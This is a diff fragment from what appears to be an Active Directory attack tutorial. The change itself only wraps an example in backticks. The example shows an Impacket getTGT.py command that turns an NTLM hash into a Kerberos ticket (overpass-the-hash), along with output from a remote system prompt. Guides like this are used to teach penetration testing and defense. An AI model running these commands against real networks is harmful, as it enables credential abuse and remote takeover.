@@ -977,7 +977,7 @@ In order to get a Kerberos ticket to use, you can request one by using the user 
 
 You should take into account that Windows and Linux machines (and the tools oriented to them) use different ticket file formats so you may have problems moving Linux tickets to a Windows machine or vice versa. You can convert the tickets between the different formats by using ticket_converter or cerbero.
 
-$ getTGT.py contoso.local/Anakin -dc-ip 192.168.100.2 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
+`$ getTGT.py contoso.local/Anakin -dc-ip 192.168.100.2 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
 [*] Saving ticket in Anakin.ccache
@@ -996,7 +996,7 @@ The system cannot find message text for message number 0x2350 in the message fil
 
 (c) Microsoft Corporation. All rights reserved.
 b'Not enough memory resources are available to process this command.\r\n'
-C:\Windows\system32>
+C:\Windows\system32>`
 psexec.py with Kerberos authentication
 When using Kerberos authentication you will need to pass as target to the tools the hostname (DNS name or NetBIOS name) of the remote machine instead of its IP. This is cause Kerberos authentication uses the hostname to identify the service of the remote machine and provide the right ticket to authenticate against it.
 
